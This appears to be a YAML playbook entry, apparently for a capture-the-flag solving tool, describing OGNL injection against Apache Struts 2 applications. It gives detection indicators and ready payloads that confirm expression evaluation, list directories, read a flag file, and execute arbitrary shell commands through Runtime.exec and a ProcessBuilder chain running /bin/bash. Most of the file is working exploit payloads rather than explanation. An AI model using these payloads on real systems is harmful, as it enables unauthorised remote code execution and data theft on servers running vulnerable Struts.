name: struts2_ognl_injection
category: web
tags: [ognl, struts2, injection, command_injection]
indicators:
  - "Apache Struts 2"
  - "OGNL"
  - "TextParseUtil.translateVariables"
  - "allowStaticMethodAccess"

tricks:
  - name: "Step 1: Identify Struts application"
    when: "First access"
    how: "Observe URL patterns and forms"
    payload: |
      # URL patterns
      http://target/sendMessageAction
      http://target/index.action
      # .action endpoints indicate Struts 2

  - name: "Step 2: Test OGNL injection"
    when: "Suspect OGNL injection"
    how: "Test if %{} is parsed"
    payload: |
      GET /sendMessageAction?message=%{2+2}
      # Response: "Your message: 4"
      # %{2+2} was evaluated! OGNL injection confirmed

  - name: "Step 3: Explore environment"
    when: "OGNL injection confirmed"
    how: "List directories to find flag"
    payload: |
      message=%{new java.io.File('/tmp').list()}
      # Response: [hsperfdata_root, flag]
      # Found flag file at /tmp/flag

  - name: "Step 4: Read flag"
    when: "Know file location"
    how: "Use Scanner to read file"
    payload: |
      message=%{new java.util.Scanner(new java.io.File('/tmp/flag')).useDelimiter('\\Z').next()}

  - name: "Alternative: Execute commands"
    when: "Need RCE"
    how: "Use Runtime or ProcessBuilder"
    payload: |
      # Runtime.exec (no output)
      %{@java.lang.Runtime@getRuntime().exec('touch /tmp/pwned')}
      
      # ProcessBuilder (with output)
      %{(#cmd='whoami')(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd}))(#p.redirectErrorStream(true))(#process=#p.start())(new java.util.Scanner(#process.getInputStream()).useDelimiter('\\Z').next())}

